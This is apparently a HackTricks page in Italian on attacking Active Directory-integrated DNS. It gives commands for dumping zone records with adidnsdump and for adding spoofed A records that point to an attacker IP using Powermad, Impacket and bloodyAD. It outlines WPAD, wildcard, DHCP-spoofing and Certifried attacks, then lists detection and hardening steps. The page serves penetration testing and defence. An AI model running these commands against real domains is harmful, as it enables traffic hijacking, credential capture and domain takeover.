# AD DNS Records

{{#include ../../banners/hacktricks-training.md}}

Per impostazione predefinita, **qualsiasi utente** in Active Directory può **enumerare tutti i record DNS** nelle zone DNS del Dominio o della Foresta, simile a un trasferimento di zona (gli utenti possono elencare gli oggetti figli di una zona DNS in un ambiente AD).

Lo strumento [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) consente **l'enumerazione** e **l'esportazione** di **tutti i record DNS** nella zona per scopi di ricognizione delle reti interne.
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (Aprile 2025) aggiunge output JSON/Greppable (`--json`), risoluzione DNS multi-threaded e supporto per TLS 1.2/1.3 durante il binding a LDAPS

Per ulteriori informazioni leggi [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

---

## Creazione / Modifica di record (spoofing ADIDNS)

Poiché il gruppo **Authenticated Users** ha **Create Child** sul DACL della zona per impostazione predefinita, qualsiasi account di dominio (o account computer) può registrare record aggiuntivi. Questo può essere utilizzato per dirottamento del traffico, coercizione di relay NTLM o persino compromissione completa del dominio.

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py è fornito con Impacket ≥0.12.0)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## Primitivi di attacco comuni

1. **Wildcard record** – `*.<zone>` trasforma il server DNS AD in un risponditore a livello aziendale simile allo spoofing LLMNR/NBNS. Può essere abusato per catturare hash NTLM o per relazionarli a LDAP/SMB.  (Richiede che la ricerca WINS sia disabilitata.)
2. **WPAD hijack** – aggiungi `wpad` (o un **NS** record che punta a un host attaccante per bypassare la Global-Query-Block-List) e proxy trasparentemente le richieste HTTP in uscita per raccogliere credenziali.  Microsoft ha corretto i bypass wildcard/DNAME (CVE-2018-8320) ma **i record NS funzionano ancora**.
3. **Stale entry takeover** – rivendica l'indirizzo IP che precedentemente apparteneva a una workstation e l'entry DNS associata continuerà a risolversi, abilitando la delega vincolata basata su risorse o attacchi Shadow-Credentials senza toccare affatto il DNS.
4. **DHCP → DNS spoofing** – su un'implementazione predefinita di Windows DHCP+DNS, un attaccante non autenticato sulla stessa subnet può sovrascrivere qualsiasi record A esistente (inclusi i Domain Controllers) inviando richieste DHCP contraffatte che attivano aggiornamenti DNS dinamici (Akamai “DDSpoof”, 2023).  Questo fornisce un attacco machine-in-the-middle su Kerberos/LDAP e può portare a un takeover completo del dominio.
5. **Certifried (CVE-2022-26923)** – cambia il `dNSHostName` di un account macchina che controlli, registra un record A corrispondente, quindi richiedi un certificato per quel nome per impersonare il DC. Strumenti come **Certipy** o **BloodyAD** automatizzano completamente il flusso.

---

## Rilevamento e indurimento

* Negare agli **Utenti Autenticati** il diritto di *Creare tutti gli oggetti figli* su zone sensibili e delegare aggiornamenti dinamici a un account dedicato utilizzato da DHCP.
* Se sono richiesti aggiornamenti dinamici, imposta la zona su **Solo sicura** e abilita la **Protezione dei nomi** in DHCP in modo che solo l'oggetto computer proprietario possa sovrascrivere il proprio record.
* Monitorare gli ID eventi del server DNS 257/252 (aggiornamento dinamico), 770 (trasferimento di zona) e scritture LDAP su `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Bloccare nomi pericolosi (`wpad`, `isatap`, `*`) con un record intenzionalmente benigno o tramite la Global Query Block List.
* Mantenere i server DNS aggiornati – ad esempio, i bug RCE CVE-2024-26224 e CVE-2024-26231 hanno raggiunto **CVSS 9.8** e sono sfruttabili da remoto contro i Domain Controllers.

## Riferimenti

* Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL and More”  (2018, ancora il riferimento de-facto per attacchi wildcard/WPAD)
* Akamai – “Spoofing DNS Records by Abusing DHCP DNS Dynamic Updates” (Dic 2023)
{{#include ../../banners/hacktricks-training.md}}
